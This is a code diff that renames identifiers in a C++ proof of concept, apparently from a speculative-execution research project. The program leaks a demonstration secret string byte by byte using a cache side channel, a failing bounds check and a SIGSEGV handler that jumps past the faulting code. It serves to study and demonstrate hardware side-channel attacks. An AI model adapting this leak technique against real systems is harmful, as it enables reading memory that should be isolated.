@@ -34,7 +34,6 @@
 
 #include <array>
 #include <cstring>
-#include <fstream>
 #include <iostream>
 
 #include <signal.h>
@@ -51,9 +50,9 @@ const char *private_data = "It's a s3kr3t!!!";
 // because of the SIGSEGV and architectural jumping over that section.
 // In the next loop the restore from stack spill just loads some random value
 // from the stack that was not rewritten.
-static char leak_byte(const char *data, volatile size_t offset) {
+static char LeakByte(const char *data, volatile size_t offset) {
   CacheSideChannel sidechannel;
-  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();
+  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();
 
   for (int run = 0;; ++run) {
     size_t safe_offset = run % strlen(data);
@@ -61,14 +60,12 @@ static char leak_byte(const char *data, volatile size_t offset) {
 
     // Checks bounds and accesses the safe offset. That succeeds.
     BoundsCheck(data, safe_offset);
-    ForceRead(isolated_oracle.data() +
-              static_cast<unsigned char>(data[safe_offset]));
+    ForceRead(oracle.data() + static_cast<unsigned char>(data[safe_offset]));
 
     // Check bounds of the offset to private data. The check fails, but the
     // speculative execution continues.
     BoundsCheck(data, offset);
-    ForceRead(isolated_oracle.data() +
-              static_cast<unsigned char>(data[offset]));
+    ForceRead(oracle.data() + static_cast<unsigned char>(data[offset]));
 
     // Unreachable code.
     std::cout << "Dead code. Must not be printed." << std::endl;
@@ -102,7 +99,7 @@ static char leak_byte(const char *data, volatile size_t offset) {
   }
 }
 
-static void sigsegv(
+static void Sigsegv(
     int /* signum */, siginfo_t * /* siginfo */, void *context) {
   // SIGSEGV signal handler.
   // Moves the instruction pointer to the "afterspeculation" label.
@@ -118,10 +115,10 @@ static void sigsegv(
 #endif
 }
 
-static void set_signal() {
+static void SetSignal() {
   struct sigaction act;
   memset(&act, 0, sizeof(struct sigaction));
-  act.sa_sigaction = sigsegv;
+  act.sa_sigaction = Sigsegv;
   act.sa_flags = SA_SIGINFO;
 #ifdef __linux__
   sigaction(SIGSEGV, &act, nullptr);
@@ -133,12 +130,12 @@ static void set_signal() {
 }
 
 int main() {
-  set_signal();
+  SetSignal();
   std::cout << "Leaking the string: ";
   std::cout.flush();
   size_t private_offset = private_data - public_data;
   for (size_t i = 0; i < strlen(private_data); ++i) {
-    std::cout << leak_byte(public_data, private_offset + i);
+    std::cout << LeakByte(public_data, private_offset + i);
     std::cout.flush();
   }
   std::cout << "\nDone!\n";
